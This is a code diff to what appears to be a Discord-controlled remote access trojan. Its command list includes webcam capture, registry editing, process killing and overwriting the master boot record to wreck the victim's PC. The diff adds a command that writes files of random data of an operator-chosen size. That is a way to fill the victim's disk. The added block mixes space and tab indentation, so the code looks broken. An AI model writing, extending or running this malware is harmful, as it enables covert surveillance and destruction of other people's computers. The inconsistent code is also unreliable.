@@ -122,6 +122,7 @@ commands_list = [
 	"timeset <year> <month> <day> <hour> <minute> - changes the system's time to a new one",
 	"webcampic - takes a pic from the user's webcam",
 	"fuckmbr - overwrites the master boot record (FUCKS THEIR PC OVER)",
+	"createfile - creates a file in a specified size in mb",
 	"regedit <key_path> <value_name> <new_value> - edits a regedit value",
 	"taskkill <name> - kills a process",
 	"processes - lists all the running processes",
@@ -557,7 +558,7 @@ async def on_message(message):
 		directory = message.content.split(" ")[1]
 		try:
 			os.chdir(directory)
-			await message.reply(await femboyaccess("cd", f"changed directory! :3\n\n{os.getcwd()}"))
+			await message.reply(await femboyaccess("cd", f"changed directory! \n\n{os.getcwd()}"))
 		except:
 			await message.reply(await femboyaccess("cd", f"unknown directory! :c"))
 
@@ -1028,7 +1029,26 @@ screenshot done, see attached file
 			await message.reply(await femboyaccess("taskkill", "killed the process! "))
 		except:
 			await message.reply(await femboyaccess("taskkill", "could not kill the process! :c"))
-
+	    if message.content.startswith("createfile"):
+	        try:
+	            # Split the message to get the filename and size (in MB)
+	            args = message.content.split(" ")
+	            filename = args[1]
+	            size_mb = int(args[2])
+	
+	            # Calculate size in bytes (1 MB = 1024 * 1024 bytes)
+	            size_bytes = size_mb * 1024 * 1024
+	
+	            # Create the file with the specified size
+	            with open(filename, 'wb') as f:
+	                f.write(os.urandom(size_bytes))  # Writing random data to fill the file
+	
+	            await message.reply(f"File '{filename}' of size {size_mb} MB created successfully!")
+	
+	        except Exception as e:
+	            await message.reply(f"Could not create the file! Error: {e}")
+	        
+	    await bot.process_commands(message)
 	if message.content.startswith("processes"):
 		try:
 			running_processes = get_running_processes()
